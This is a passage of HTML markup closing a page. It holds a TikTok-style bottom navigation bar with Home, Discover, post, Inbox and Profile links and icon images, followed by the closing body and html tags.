      </div> </div> <div class="tiktok-nav">
      <a href="#" class="nav-item active">
        <amp-img src="https://api.iconify.design/mdi:home.svg?color=%230ff" width="22" height="22" layout="fixed" alt="Home"></amp-img>
        <span>Home</span>
      </a>
      <a href="#" class="nav-item">
        <amp-img src="https://api.iconify.design/mdi:compass-outline.svg?color=%23888" width="22" height="22" layout="fixed" alt="Discover"></amp-img>
        <span>Discover</span>
      </a>
      <a href="#" class="nav-post">
        <span>+</span>
      </a>
      <a href="#" class="nav-item">
        <amp-img src="https://api.iconify.design/mdi:message-outline.svg?color=%23888" width="22" height="22" layout="fixed" alt="Inbox"></amp-img>
        <span>Inbox</span>
      </a>
      <a href="#" class="nav-item">
        <amp-img src="https://api.iconify.design/mdi:account-outline.svg?color=%23888" width="22" height="22" layout="fixed" alt="Profile"></amp-img>
        <span>Profile</span>
      </a>
    </div>

  </div>

</body>
</html>
